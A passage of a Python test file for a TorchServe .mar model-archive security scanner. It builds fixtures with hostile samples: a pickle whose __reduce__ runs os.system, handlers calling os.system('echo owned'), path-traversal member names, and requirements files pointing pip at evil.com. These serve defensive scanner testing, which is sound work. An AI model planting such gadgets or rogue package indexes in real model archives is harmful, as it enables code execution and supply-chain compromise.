"""Tests for TorchServe .mar scanner."""

from __future__ import annotations

import ast
import json
import pickle
import zipfile
from collections.abc import Mapping, Sequence
from pathlib import Path
from typing import Any, cast

import pytest

from modelaudit import core
from modelaudit.scanners.base import CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.torchserve_mar_scanner import TorchServeMarScanner
from modelaudit.scanners.zip_scanner import ZipScanner


def _create_mar_archive(
    tmp_path: Path,
    manifest: dict[str, Any] | str | None,
    entries: Mapping[str, bytes] | Sequence[tuple[str, bytes]],
    filename: str = "model.mar",
    compression: int = zipfile.ZIP_STORED,
) -> Path:
    mar_path = tmp_path / filename
    with zipfile.ZipFile(mar_path, "w", compression=compression) as archive:
        if manifest is not None:
            manifest_bytes = (
                manifest.encode("utf-8")
                if isinstance(manifest, str)
                else json.dumps(manifest).encode(
                    "utf-8",
                )
            )
            archive.writestr("MAR-INF/MANIFEST.json", manifest_bytes)

        archive_entries = entries.items() if isinstance(entries, Mapping) else entries
        for name, data in archive_entries:
            archive.writestr(name, data)

    return mar_path


def _build_malicious_pickle() -> bytes:
    import os as os_module

    class DangerousPayload:
        def __reduce__(self):
            return (os_module.system, ("echo torchserve-mar-test",))

    return pickle.dumps(DangerousPayload())


def _failed_checks(result: ScanResult, check_name: str) -> list[Any]:
    return [check for check in result.checks if check.name == check_name and check.status == CheckStatus.FAILED]


def _checks_named(result: ScanResult, check_name: str) -> list[Any]:
    return [check for check in result.checks if check.name == check_name]


def test_can_handle_valid_mar_archive(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
        },
    )

    assert TorchServeMarScanner.can_handle(str(mar_path))


def test_can_handle_rejects_non_zip_and_missing_manifest(tmp_path: Path) -> None:
    non_zip_mar = tmp_path / "not_zip.mar"
    non_zip_mar.write_bytes(b"not a zip archive")
    assert not TorchServeMarScanner.can_handle(str(non_zip_mar))

    missing_manifest_mar = _create_mar_archive(tmp_path, manifest=None, entries={"weights.bin": b"weights"})
    assert not TorchServeMarScanner.can_handle(str(missing_manifest_mar))


def test_can_handle_rejects_invalid_manifest_json(tmp_path: Path) -> None:
    invalid_manifest_mar = _create_mar_archive(
        tmp_path,
        manifest='{"model": {"handler": "handler.py", "serializedFile": "weights.bin"',
        entries={"handler.py": b"def handle(data, context):\n    return data\n", "weights.bin": b"weights"},
    )

    assert not TorchServeMarScanner.can_handle(str(invalid_manifest_mar))


def test_scan_benign_mar_with_safe_handler(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin", "extraFiles": "labels.json"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "labels.json": b'{"0": "cat"}',
        },
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
    assert len(handler_failures) == 0


def test_scan_flags_duplicate_handler_member_even_when_benign_copy_is_last(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"import os\n\ndef handle(data, context):\n    return os.system('echo owned')\n"),
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
        ],
        filename="duplicate_handler_override.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")

    assert len(handler_failures) == 1
    assert "os.system" in handler_failures[0].message
    assert handler_failures[0].details["handler"] == "handler.py"


def test_scan_accepts_clean_duplicate_handler_members(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("handler.py", b"def handle(data, context):\n    return {'still_ok': True}\n"),
            ("weights.bin", b"weights"),
        ],
        filename="duplicate_handler_clean.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")

    assert handler_failures == []


def test_non_handler_python_analysis_clean_handler_and_utils_has_no_failures(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n",
            "utils.py": b"def transform(data):\n    return {'ok': True, 'data': data}\n",
            "weights.bin": b"weights",
        },
        filename="clean_utils.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert len(non_handler_failures) == 0

    relationship_checks = [
        check
        for check in result.checks
        if check.name == "MAR Non-Handler Python Analysis"
        and check.status == CheckStatus.PASSED
        and check.details.get("import_relationships")
    ]
    assert len(relationship_checks) >= 1
    relationships = relationship_checks[0].details["import_relationships"]
    assert any(
        relationship["handler"] == "handler.py" and relationship["resolved_member"] == "utils.py"
        for relationship in relationships
    )


def test_non_handler_python_analysis_tracks_relative_import_relationships(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "pkg/handlers/model.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "pkg/handlers/model.py": (
                b"from . import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n"
            ),
            "pkg/handlers/utils.py": b"def transform(data):\n    return {'ok': True, 'data': data}\n",
            "weights.bin": b"weights",
        },
        filename="relative_utils.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    relationship_checks = [
        check
        for check in result.checks
        if check.name == "MAR Non-Handler Python Analysis"
        and check.status == CheckStatus.PASSED
        and check.details.get("import_relationships")
    ]
    assert len(relationship_checks) >= 1
    relationships = relationship_checks[0].details["import_relationships"]
    assert any(
        relationship["handler"] == "pkg/handlers/model.py"
        and relationship["imported_module"] == "pkg.handlers.utils"
        and relationship["resolved_member"] == "pkg/handlers/utils.py"
        for relationship in relationships
    )


def test_non_handler_python_analysis_detects_malicious_utils_module(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n",
            "utils.py": b"import os\n\ndef transform(data):\n    return os.system('echo owned')\n",
            "weights.bin": b"weights",
        },
        filename="malicious_utils.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert len(non_handler_failures) >= 1
    assert any(
        check.severity == IssueSeverity.WARNING and "high-risk calls: os.system" in check.message
        for check in non_handler_failures
    )


def test_non_handler_python_analysis_flags_duplicate_module_even_when_benign_copy_is_last(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n"),
            ("utils.py", b"import os\n\ndef transform(data):\n    return os.system('echo owned')\n"),
            ("utils.py", b"def transform(data):\n    return {'ok': True, 'data': data}\n"),
            ("weights.bin", b"weights"),
        ],
        filename="duplicate_utils_override.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")

    assert len(non_handler_failures) >= 1
    assert any(
        failure.details.get("member") == "utils.py" and "high-risk calls: os.system" in failure.message
        for failure in non_handler_failures
    )


def test_non_handler_python_analysis_accepts_clean_duplicate_modules(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n"),
            ("utils.py", b"def transform(data):\n    return {'ok': True, 'data': data}\n"),
            ("utils.py", b"def transform(data):\n    return {'still_ok': True, 'data': data}\n"),
            ("weights.bin", b"weights"),
        ],
        filename="duplicate_utils_clean.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")

    assert non_handler_failures == []


def test_non_handler_python_analysis_parses_each_helper_module_once(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n",
            "utils.py": b"def transform(data):\n    return {'ok': True, 'data': data}\n",
            "weights.bin": b"weights",
        },
        filename="single_parse_utils.mar",
    )

    real_parse = ast.parse
    parsed_sources: list[str] = []

    def counting_parse(source: str, *args: Any, **kwargs: Any) -> ast.AST:
        parsed_sources.append(source)
        return cast(ast.AST, real_parse(source, *args, **kwargs))

    monkeypatch.setattr("modelaudit.scanners.torchserve_mar_scanner.ast.parse", counting_parse)

    result = TorchServeMarScanner().scan(str(mar_path))

    assert result.success
    handler_parse_count = sum("def handle(data, context)" in source for source in parsed_sources)
    utils_parse_count = sum("def transform(data)" in source for source in parsed_sources)
    assert handler_parse_count == 1
    assert utils_parse_count == 1


def test_non_handler_python_metadata_assignments_do_not_trigger_import_time_execution(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n",
            "utils.py": (
                b'"""Metadata-only helper."""\n'
                b'__all__ = ["transform"]\n'
                b'__version__ = "1.0.0"\n'
                b"import typing\n"
                b"if typing.TYPE_CHECKING:\n"
                b"    from typing import Any\n"
                b'if __name__ == "__main__":\n'
                b'    raise RuntimeError("cli only")\n'
                b"\n"
                b"def transform(data):\n"
                b"    return data\n"
            ),
            "weights.bin": b"weights",
        },
        filename="metadata_only_utils.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert non_handler_failures == []


def test_non_handler_python_logger_initialization_does_not_trigger_import_time_execution(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n",
            "utils.py": (
                b"import logging as log\nlogger = log.getLogger(__name__)\n\ndef transform(data):\n    return data\n"
            ),
            "weights.bin": b"weights",
        },
        filename="logger_init_utils.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert non_handler_failures == []


def test_non_handler_python_analysis_detects_malicious_init_module(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"import pkg\n\ndef handle(data, context):\n    return {'ok': True}\n",
            "pkg/__init__.py": b"import os\nos.system('echo owned')\n",
            "weights.bin": b"weights",
        },
        filename="malicious_init.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert len(non_handler_failures) >= 1
    assert any(
        check.severity == IssueSeverity.WARNING and "__init__.py executes during package import" in check.message
        for check in non_handler_failures
    )


def test_non_handler_python_analysis_without_extra_python_files_is_back_compatible(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
        },
        filename="no_extra_python.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert len(non_handler_failures) == 0


def test_non_handler_python_analysis_respects_entry_limit(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "utils.py": b"import os\n\ndef transform(data):\n    return os.system('echo owned')\n",
            "weights.bin": b"weights",
        },
        filename="entry_limit_non_handler.mar",
    )

    result = TorchServeMarScanner(config={"max_mar_entries": 2}).scan(str(mar_path))

    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert len(non_handler_failures) == 0
    entry_limit_failures = _failed_checks(result, "TorchServe MAR Entry Limit")
    assert len(entry_limit_failures) == 1


def test_non_handler_python_analysis_respects_uncompressed_budget(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "utils.py": b"import os\n\ndef transform(data):\n    return os.system('echo owned')\n",
            "weights.bin": b"weights",
        },
        filename="budget_limited_non_handler.mar",
    )

    with zipfile.ZipFile(mar_path, "r") as archive:
        member_sizes = {info.filename: info.file_size for info in archive.infolist()}

    budget = member_sizes["MAR-INF/MANIFEST.json"] + member_sizes["handler.py"]
    result = TorchServeMarScanner(config={"max_mar_uncompressed_bytes": budget}).scan(str(mar_path))

    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert len(non_handler_failures) == 0
    budget_failures = _failed_checks(result, "TorchServe MAR Uncompressed Size Budget")
    assert len(budget_failures) == 1


def test_non_handler_python_analysis_handles_valueerror_from_ast_parse(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n",
            "utils.py": b"def transform(data):\n    return {'ok': True, 'data': data}\n",
            "weights.bin": b"weights",
        },
        filename="valueerror_utils.mar",
    )

    real_parse = ast.parse

    def parse_with_valueerror(source: str, *args: Any, **kwargs: Any) -> ast.AST:
        if "def transform(data)" in source:
            raise ValueError("source code string cannot contain null bytes")
        return cast(ast.AST, real_parse(source, *args, **kwargs))

    monkeypatch.setattr("modelaudit.scanners.torchserve_mar_scanner.ast.parse", parse_with_valueerror)

    result = TorchServeMarScanner().scan(str(mar_path))

    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert any(
        check.location == f"{mar_path}:utils.py"
        and "Unable to parse non-handler Python source for static analysis" in check.message
        and check.details.get("analysis_kind") == "syntax"
        for check in non_handler_failures
    )
    assert not _failed_checks(result, "TorchServe MAR Scan")
    assert result.success


def test_non_handler_python_analysis_read_failure_is_reported_without_aborting(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n",
            "utils.py": b"def transform(data):\n    return {'ok': True, 'data': data}\n",
            "weights.bin": b"weights",
        },
        filename="read_failure_utils.mar",
    )

    scanner = TorchServeMarScanner()
    original_read_member_bounded = scanner._read_member_bounded

    def read_with_failure(archive: zipfile.ZipFile, member_info: zipfile.ZipInfo, max_bytes: int) -> bytes:
        if member_info.filename == "utils.py":
            raise RuntimeError("CRC mismatch")
        return original_read_member_bounded(archive, member_info, max_bytes)

    monkeypatch.setattr(scanner, "_read_member_bounded", read_with_failure)

    result = scanner.scan(str(mar_path))

    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert any(
        check.location == f"{mar_path}:utils.py"
        and "Unable to read non-handler Python source for static analysis: CRC mismatch" in check.message
        and check.details.get("analysis_kind") == "read"
        for check in non_handler_failures
    )
    assert not _failed_checks(result, "TorchServe MAR Scan")
    assert result.success


def test_scan_resolves_bare_module_handler_names(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "custom_handler", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "custom_handler.py": b"import os\n\ndef handle(data, context):\n    return os.system('id')\n",
            "weights.bin": b"weights",
        },
        filename="bare_handler.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    manifest_integrity_failures = _failed_checks(result, "TorchServe Manifest Reference Integrity")
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")

    assert len(manifest_integrity_failures) == 0
    assert len(handler_failures) >= 1
    assert any(
        failure.severity == IssueSeverity.CRITICAL and "os.system" in failure.message for failure in handler_failures
    )


def test_scan_analyzes_all_resolved_handler_candidates(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "custom_handler", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "custom_handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "custom_handler/__init__.py": b"import os\n\ndef handle(data, context):\n    return os.system('id')\n",
            "weights.bin": b"weights",
        },
        filename="bare_handler_with_package.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    manifest_integrity_failures = _failed_checks(result, "TorchServe Manifest Reference Integrity")
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")

    assert len(manifest_integrity_failures) == 0
    assert any(
        failure.severity == IssueSeverity.CRITICAL
        and failure.location == f"{mar_path}:custom_handler/__init__.py"
        and "os.system" in failure.message
        for failure in handler_failures
    )


def test_scan_resolves_slash_delimited_handler_names(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "pkg/handlers/model:handle", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "pkg/handlers/model.py": b"import os\n\ndef handle(data, context):\n    return os.system('id')\n",
            "weights.bin": b"weights",
        },
        filename="slash_handler.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    manifest_integrity_failures = _failed_checks(result, "TorchServe Manifest Reference Integrity")
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")

    assert len(manifest_integrity_failures) == 0
    assert any(
        failure.severity == IssueSeverity.CRITICAL
        and failure.location == f"{mar_path}:pkg/handlers/model.py"
        and "os.system" in failure.message
        for failure in handler_failures
    )


def test_scan_detects_malicious_pickle_payload_in_serialized_file(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "model.pkl"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "model.pkl": _build_malicious_pickle(),
        },
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    serialized_security_checks = _failed_checks(result, "TorchServe Serialized Payload Security")
    assert len(serialized_security_checks) >= 1
    assert any(":model.pkl" in (issue.location or "") for issue in result.issues)


def test_scan_detects_path_traversal_member_names(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
            "../../evil.pkl": _build_malicious_pickle(),
        },
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    traversal_failures = _failed_checks(result, "TorchServe MAR Path Traversal Protection")
    assert len(traversal_failures) >= 1
    assert traversal_failures[0].severity == IssueSeverity.CRITICAL


def test_scan_reports_missing_manifest_when_forced(tmp_path: Path) -> None:
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=None,
        entries={"handler.py": b"def handle(data, context):\n    return data\n"},
        filename="missing_manifest.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    manifest_failures = _failed_checks(result, "TorchServe Manifest Presence")
    assert len(manifest_failures) == 1


def test_scan_handles_corrupt_mar_gracefully(tmp_path: Path) -> None:
    mar_path = tmp_path / "corrupt.mar"
    mar_path.write_bytes(b"PK\x03\x04this-is-not-a-valid-zip")

    result = TorchServeMarScanner().scan(str(mar_path))
    archive_failures = _failed_checks(result, "TorchServe MAR Archive Validation")
    assert len(archive_failures) == 1
    assert result.success is False


def test_scan_detects_nested_zip_payloads(tmp_path: Path) -> None:
    nested_zip = tmp_path / "nested.zip"
    with zipfile.ZipFile(nested_zip, "w") as nested:
        nested.writestr("payload.pkl", _build_malicious_pickle())

    manifest = {
        "model": {
            "handler": "handler.py",
            "serializedFile": "weights.bin",
            "extraFiles": "nested.zip",
        },
    }
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
            "nested.zip": nested_zip.read_bytes(),
        },
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    assert any(".mar:nested.zip" in (issue.location or "") for issue in result.issues)


def test_core_routes_mar_to_dedicated_scanner(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
        },
    )

    result = core.scan_file(str(mar_path))
    assert result.scanner_name == "torchserve_mar"
    assert result.scanner_name != "unknown"


def test_core_falls_back_to_zip_scanner_for_non_torchserve_mar(tmp_path: Path) -> None:
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=None,
        entries={"../evil.txt": b"malicious"},
        filename="invalid.mar",
    )

    result = core.scan_file(str(mar_path))
    assert result.scanner_name == "zip"
    assert any("path traversal" in f"{issue.message} {issue.why or ''}".lower() for issue in result.issues)


def test_core_falls_back_to_zip_scanner_for_invalid_manifest_json(tmp_path: Path) -> None:
    mar_path = _create_mar_archive(
        tmp_path,
        manifest='{"model": {"handler": "handler.py", "serializedFile": "weights.bin"',
        entries={"handler.py": b"def handle(data, context):\n    return data\n", "../evil.txt": b"malicious"},
        filename="invalid_manifest.mar",
    )

    result = core.scan_file(str(mar_path))
    assert result.scanner_name == "zip"
    assert any("path traversal" in f"{issue.message} {issue.why or ''}".lower() for issue in result.issues)


def test_core_detects_high_risk_handler_in_non_torchserve_mar(tmp_path: Path) -> None:
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=None,
        entries={
            "handler.py": b"import os\n\ndef handle(data, context):\n    return os.system('echo owned')\n",
        },
        filename="handler_only.mar",
    )

    result = core.scan_file(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
    assert result.scanner_name == "zip"
    assert len(handler_failures) >= 1
    assert handler_failures[0].severity == IssueSeverity.CRITICAL
    assert "os.system" in handler_failures[0].message


def test_false_positive_reduction_comments_and_strings_only(tmp_path: Path) -> None:
    handler_code = b"""
def handle(data, context):
    # os.system("should not run")
    marker = "subprocess.Popen should not trigger from string"
    return {"marker": marker}
"""
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={"handler.py": handler_code, "weights.bin": b"weights"},
        filename="comments_only.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
    assert len(handler_failures) == 0


def test_bypass_prevention_comments_do_not_suppress_real_call_detection(tmp_path: Path) -> None:
    handler_code = b"""
def handle(data, context):
    # os.system("decoy")
    # subprocess.Popen("decoy")
    \"\"\"docstring with eval('decoy')\"\"\"
    import subprocess as sp
    return sp.run(["echo", "real-call"])
"""
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={"handler.py": handler_code, "weights.bin": b"weights"},
        filename="bypass_attempt.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
    assert len(handler_failures) >= 1
    assert handler_failures[0].severity == IssueSeverity.CRITICAL
    assert "subprocess.run" in handler_failures[0].message


def test_manifest_read_is_bounded(tmp_path: Path) -> None:
    oversized_manifest = {
        "model": {
            "handler": "handler.py",
            "serializedFile": "weights.bin",
            "extraFiles": "A" * (TorchServeMarScanner.MAX_MANIFEST_BYTES + 10),
        },
    }
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=oversized_manifest,
        entries={"handler.py": b"def handle(data, context):\n    return data\n", "weights.bin": b"weights"},
        filename="oversized_manifest.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    manifest_size_failures = _failed_checks(result, "TorchServe Manifest Size Limit")
    assert len(manifest_size_failures) == 1


def test_scan_detects_suspicious_compression_ratio_in_valid_mar(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"A" * (512 * 1024),
        },
        filename="compressed.mar",
        compression=zipfile.ZIP_DEFLATED,
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    ratio_failures = _failed_checks(result, "TorchServe MAR Compression Ratio Check")
    assert len(ratio_failures) >= 1
    assert any(check.details.get("entry") == "weights.bin" for check in ratio_failures)


def test_core_mar_fallback_bounds_python_handler_analysis_size(tmp_path: Path) -> None:
    oversized_handler = b"#" + (b"a" * ZipScanner.MAX_MAR_PYTHON_ANALYSIS_BYTES)
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=None,
        entries={"handler.py": oversized_handler},
        filename="oversized_handler.mar",
    )

    result = core.scan_file(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
    assert result.scanner_name == "zip"
    assert len(handler_failures) == 1
    assert handler_failures[0].severity == IssueSeverity.WARNING
    assert "oversized entry" in handler_failures[0].message.lower()
    assert handler_failures[0].details["entry_size"] == len(oversized_handler)
    assert handler_failures[0].details["size_limit"] == ZipScanner.MAX_MAR_PYTHON_ANALYSIS_BYTES


def test_core_mar_fallback_rejects_boolean_size_limit_config(tmp_path: Path) -> None:
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=None,
        entries={"handler.py": b"def handle(data, context):\n    return {'ok': True}\n"},
        filename="bool_limit.mar",
    )

    result = core.scan_file(str(mar_path), {"max_mar_python_analysis_bytes": True})
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
    assert result.scanner_name == "zip"
    assert len(handler_failures) == 0


def test_scan_flags_non_pypi_requirements_index_as_critical(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"--index-url http://evil.com/simple\nnumpy==1.26.4\n",
        },
        filename="requirements_evil_index.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
    assert any(
        finding["reason"] == "non_pypi_index_url" for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_flags_non_pypi_requirements_index_equals_form_as_critical(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"--index-url=https://evil.com/simple\nnumpy==1.26.4\n",
        },
        filename="requirements_evil_index_equals.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
    assert any(
        finding["reason"] == "non_pypi_index_url" for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_flags_non_pypi_requirements_short_index_option_as_critical(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "requirements.txt": b"-i https://evil.com/simple\nnumpy==1.26.4\n",
        },
        filename="requirements_evil_index_short.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")

    assert len(requirements_failures) == 1
    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
    assert any(
        finding["reason"] == "non_pypi_index_url" for finding in requirements_failures[0].details.get("findings", [])
    )


def test_scan_flags_non_pypi_requirements_concatenated_short_index_option_as_critical(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
